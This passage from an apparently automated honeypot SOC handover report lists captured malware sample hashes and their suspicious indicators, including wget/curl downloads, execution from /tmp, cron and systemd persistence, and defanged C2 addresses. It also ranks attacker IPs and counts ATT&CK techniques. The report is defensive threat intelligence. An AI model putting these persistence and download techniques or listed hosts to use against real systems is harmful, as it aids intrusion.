| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `137.184.169[.]96` | CA | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `104.155.84[.]46` | BE | Google LLC | **100** ⚠️ | 3 |
| `85.217.149[.]11` | CA | Modat B.V. | **100** ⚠️ | 50 |
| `221.156.173[.]44` | KR | Korea Telecom | **100** ⚠️ | 1 |
| `181.198.55[.]155` | EC | Telconet S.A | **100** ⚠️ | 2 |
| `168.227.200[.]165` | BR | Century Telecom Ltda | **100** ⚠️ | 3 |
| `52.248.43[.]126` | US | Microsoft Corporation | **100** ⚠️ | 6 |
| `110.41.134[.]170` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 2 |
| `85.217.149[.]17` | CA | NL MODAT | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 230 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 187 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 66 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 60 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 7 |

---

## 🔕 False Positive Summary (58 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 23 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 373 cases |
| Tool 34  | Credential Extractor        | ✅ 4461 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 32 fingerprints |
| Tool 36  | Command Clustering          | ✅ 14 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 220 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 58 filtered (15.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 106 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 182 priority case(s) shown individually · 119 recon entry/entries in table (10 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-22T16:17:53Z_
